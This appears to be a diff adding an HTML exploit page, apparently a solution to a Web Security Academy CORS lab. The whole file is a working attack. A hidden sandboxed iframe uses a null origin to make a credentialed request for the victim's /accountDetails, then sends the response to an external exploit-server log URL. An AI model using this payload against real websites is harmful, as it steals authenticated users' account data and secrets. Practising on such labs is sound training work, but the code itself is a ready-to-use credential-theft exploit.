@@ -1,0 +1,17 @@
+<html>
+    <body>
+        <iframe style="display: none;" sandbox="allow-scripts" srcdoc="
+        <script>
+            var xhr = new XMLHttpRequest();
+            var url = 'https://0a48008504c7813a860d17080047001f.web-security-academy.net'
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == XMLHttpRequest.DONE) {
+                    fetch('https://exploit-0a5d00c8043181fb864816a3017400b2.exploit-server.net/log?key=' + xhr.responseText)
+                }
+            }
+            xhr.open('GET', url + '/accountDetails', true);
+            xhr.withCredentials = true;
+            xhr.send(null);
+        </script>"></iframe>
+    </body>
+</html>
